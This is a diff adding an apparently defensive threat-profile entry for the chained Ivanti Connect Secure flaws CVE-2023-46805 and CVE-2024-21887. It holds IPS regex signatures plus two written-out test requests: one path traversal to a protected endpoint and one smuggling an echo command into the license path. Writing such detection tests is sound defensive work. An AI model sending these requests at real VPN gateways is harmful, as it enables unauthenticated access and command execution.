@@ -1,0 +1,46 @@
+id: TP-2023-46805
+cve: [CVE-2023-46805, CVE-2024-21887]
+name: Ivanti.Connect.Secure.API.Path.Traversal
+severity: critical
+target: {os: [Ivanti ICS], app: [Ivanti Connect Secure, Ivanti Policy Secure]}
+location: server
+summary: >-
+  Ivanti Connect Secure and Policy Secure 9.x and 22.x let an unauthenticated request reach protected
+  REST endpoints by walking up from an unprotected one: /api/v1/totp/user-backup-code/../../<other path>.
+  Chained with a command injection in license and archiving endpoints (CVE-2024-21887), it gave
+  attackers code execution on VPN gateways in January 2024.
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-46805
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-21887
+  - https://www.rapid7.com/blog/post/ra-cve-2023-46805-analysis/
+signatures:
+  - id: 9100021
+    name: Path traversal out of the TOTP backup-code endpoint
+    proto: tcp
+    ports: [80, 443, 8443]
+    match:
+      - {buf: uri, regex: "/api/v1/totp/user-backup-code/+\\.\\./", nocase: true}
+  - id: 9100022
+    name: Command separator in the license keys-status path
+    proto: tcp
+    ports: [80, 443, 8443]
+    match:
+      - {buf: uri, regex: "/license/keys-status/[^ ]*;", nocase: true}
+generator:
+  port: 443
+  tls: true
+  variants:
+    - name: system-information
+      request: |-
+        GET /api/v1/totp/user-backup-code/../../system/system-information HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: python-requests/2.31.0
+        Connection: close
+    - name: keys-status-injection
+      request: |-
+        GET /api/v1/totp/user-backup-code/../../license/keys-status/%3Becho%20{{token}}%3B HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: python-requests/2.31.0
+        Connection: close
+server_effect: {process: none, when: allowed}
+lesson: A third-party VPN published through a VIP still needs an IPS sensor on that policy, and deep inspection, because the request is HTTPS.
